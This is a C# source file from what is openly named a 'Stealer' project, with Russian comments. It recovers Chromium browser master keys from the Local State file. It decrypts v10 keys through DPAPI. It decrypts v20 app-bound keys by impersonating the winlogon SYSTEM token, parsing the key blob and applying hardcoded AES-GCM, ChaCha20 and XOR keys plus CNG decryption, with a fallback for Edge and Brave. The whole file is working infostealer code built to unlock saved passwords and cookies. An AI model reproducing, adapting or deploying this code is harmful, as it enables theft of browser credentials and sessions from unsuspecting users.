using System;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace Stealer.Crypto
{
    public static class LocalState
    {
        public static byte[] GetMasterKeyV10(string localStatePath)
        {
            try
            {
                if (!File.Exists(localStatePath))
                    return null;

                string content = LocalStateContent(localStatePath);
                var match = Regex.Match(content, "\"encrypted_key\":\"(.*?)\"");
                
                if (!match.Success)
                    return null;

                byte[] encryptedKey = Convert.FromBase64String(match.Groups[1].Value);
                
                // Пропускаем первые 5 байт (DPAPI prefix)
                return DpApi.Decrypt(encryptedKey.Skip(5).ToArray());
            }
            catch
            {
                return null;
            }
        }

        public static byte[] GetMasterKeyV20(string localStatePath)
        {
            try
            {
                if (!File.Exists(localStatePath))
                    return null;

                string content = LocalStateContent(localStatePath);
                
                // Проверяем есть ли app_bound_encrypted_key
                var match = Regex.Match(content, "\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
                
                if (!match.Success)
                {
                    return null;
                }

                byte[] rawAppBoundBytes = Convert.FromBase64String(match.Groups[1].Value).Skip(4).ToArray();
                byte[] decryptedBytes = DecryptAsSystemUser(rawAppBoundBytes);

                if (decryptedBytes == null || decryptedBytes.Length == 0)
                {
                    // Fallback to CurrentUser DPAPI if System Impersonation failed or user is not elevated
                    decryptedBytes = DpApi.Decrypt(rawAppBoundBytes);
                }

                if (decryptedBytes == null || decryptedBytes.Length == 0)
                    return null;

                // Try parsing standard Blob
                BlobParsedData blobParsedData = ParseKeyBlob.Parse(decryptedBytes);
                
                if (blobParsedData != null)
                {
                    switch (blobParsedData.Flag)
                    {
                        case 1:
                            // AES-GCM с хардкоженным ключом
                            return AesGcm256.Decrypt(new byte[32]
                            {
                                179, 28, 110, 36, 26, 200, 70, 114, 141, 169,
                                193, 250, 196, 147, 102, 81, 207, 251, 148, 77,
                                20, 58, 184, 22, 39, 107, 204, 109, 160, 40,
                                71, 135
                            }, blobParsedData.Iv, null, blobParsedData.Ciphertext, blobParsedData.Tag);
                        
                        case 2:
                            // ChaCha20-Poly1305 с хардкоженным ключом
                            return ChaCha20Poly1305.Decrypt(new byte[32]
                            {
                                233, 143, 55, 215, 244, 225, 250, 67, 61, 25,
                                48, 77, 194, 37, 128, 66, 9, 14, 45, 29,
                                126, 234, 118, 112, 212, 31, 115, 141, 8, 114,
                                150, 96
                            }, blobParsedData.Iv, blobParsedData.Ciphertext, blobParsedData.Tag, null);
                        
                        case 3:
                        {
                            // CNG + AES-GCM с XOR
                            byte[] xorKey = new byte[32]
                            {
                                204, 248, 161, 206, 197, 102, 5, 184, 81, 117,
                                82, 186, 26, 45, 6, 28, 3, 162, 158, 144,
                                39, 79, 178, 252, 245, 155, 164, 183, 92, 57,
                                35, 144
                            };
                            byte[] decryptedKey = CDecryptor(blobParsedData.EncryptedAesKey);
                            if (decryptedKey != null)
                            {
                                for (int i = 0; i < decryptedKey.Length && i < xorKey.Length; i++)
                                {
                                    decryptedKey[i] ^= xorKey[i];
                                }
                                return AesGcm256.Decrypt(decryptedKey, blobParsedData.Iv, null, blobParsedData.Ciphertext, blobParsedData.Tag);
                            }
                            break;
                        }
                        
                        case 32:
                            // Прямой ключ
                            return blobParsedData.EncryptedAesKey;
                    }
                }

                // Fallback: try v20_2 format (used in Edge/Brave)
                try
                {
                    if (decryptedBytes.Length > 8)
                    {
                        int len1 = BitConverter.ToInt32(decryptedBytes, 0);
                        if (len1 > 0 && len1 + 8 < decryptedBytes.Length)
                        {
                            int len2 = BitConverter.ToInt32(decryptedBytes, 4 + len1);
                            if (len2 > 0 && 4 + len1 + 4 + len2 <= decryptedBytes.Length)
                            {
                                byte[] blob2 = new byte[len2];
                                Buffer.BlockCopy(decryptedBytes, 4 + len1 + 4, blob2, 0, len2);
                                return blob2;
                            }
                        }
                    }
                }
                catch { }

                return null;
            }
            catch
            {
                return null;
            }
        }

        private static byte[] CDecryptor(byte[] encryptedData)
        {
            try
            {
                using (ImpersonationHelper.ImpersonateWinlogon())
                {
                    return CngDecryptor.Decrypt(encryptedData, "Microsoft Software Key Storage Provider", "Google Chromekey1");
                }
            }
            catch
            {
                try
                {
                    return CngDecryptor.Decrypt(encryptedData, "Microsoft Software Key Storage Provider", "Google Chromekey1");
                }
                catch
                {
                    return null;
                }
            }
        }

        private static byte[] DecryptAsSystemUser(byte[] encryptedData)
        {
            try
            {
                using (ImpersonationHelper.ImpersonateWinlogon())
                {
                    encryptedData = DpApi.Decrypt(encryptedData);
                }
                return DpApi.Decrypt(encryptedData);
            }
            catch
            {
                return null;
            }
        }

        private static string LocalStateContent(string localstate)
        {
            string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(localstate, tempPath, true);
            string result = File.ReadAllText(tempPath);
            try { File.Delete(tempPath); } catch { }
            return result;
        }
    }
}
